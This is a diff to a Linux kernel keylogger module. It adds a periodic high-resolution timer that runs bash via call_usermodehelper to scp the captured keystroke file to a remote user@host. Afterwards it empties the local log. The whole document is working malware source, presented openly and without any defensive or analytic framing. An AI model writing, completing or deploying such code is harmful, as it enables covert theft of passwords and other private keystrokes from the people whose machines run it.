@@ -4,6 +4,13 @@
 #include <linux/semaphore.h>
 #include <linux/workqueue.h>
 
+#include <linux/interrupt.h>
+#include <linux/hrtimer.h>
+#include <linux/sched.h>
+
+static struct hrtimer htimer;
+static ktime_t kt_periode;
+
 static struct semaphore sem;
 static int shiftKeyDepressed = 1;
 static int altGrDepressed = 1;
@@ -21,6 +28,18 @@ typedef struct {
 } my_work_t;
 
 my_work_t *work_keylogger, *work_start;
+
+static void keylogger_scp(void) 
+{
+    char *argv[] = { "/bin/bash", "-c", "scp " FILE_KEY USER "@" HOST ":" PATH_DST, NULL };
+    char *envp[] = { "HOME=" DEFAULT_PATH, NULL };
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+
+    char *argv_d[] = { "/bin/bash", "-c", "> " FILE_KEY, NULL };
+    char *envp_d[] = { "HOME=" DEFAULT_PATH, NULL };
+    call_usermodehelper(argv_d[0], argv_d, envp_d, UMH_WAIT_EXEC);
+}
+
 
 static int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) 
 {
@@ -144,6 +163,16 @@ static struct notifier_block keylogger_nb =
     .notifier_call = keylogger_notify
 };
 
+static enum hrtimer_restart timer_keylogger(struct hrtimer * timer)
+{
+    dbg("keylogger: Timer done\n");
+
+    keylogger_scp();
+
+    hrtimer_forward_now(timer, kt_periode);
+    return HRTIMER_RESTART;
+}
+
 void keylogger_init(void)
 {
     int ret;
@@ -166,6 +195,12 @@ void keylogger_init(void)
 
     }
 
+    /* timer callback */
+    kt_periode = ktime_set(TIMER_KEYLOGGER, 0); //seconds,nanoseconds
+    hrtimer_init (& htimer, CLOCK_REALTIME, HRTIMER_MODE_REL);
+    htimer.function = timer_keylogger;
+    hrtimer_start(& htimer, kt_periode, HRTIMER_MODE_REL);
+
     register_keyboard_notifier(&keylogger_nb);
     printk("Keylogger: Registering the keylogger module with the keyboard notifier list\n");
     sema_init(&sem, 1);
@@ -173,6 +208,7 @@ void keylogger_init(void)
 
 void keylogger_release(void)
 {
+    hrtimer_cancel(& htimer);
     flush_workqueue( my_wq );
     destroy_workqueue( my_wq );
     unregister_keyboard_notifier(&keylogger_nb);
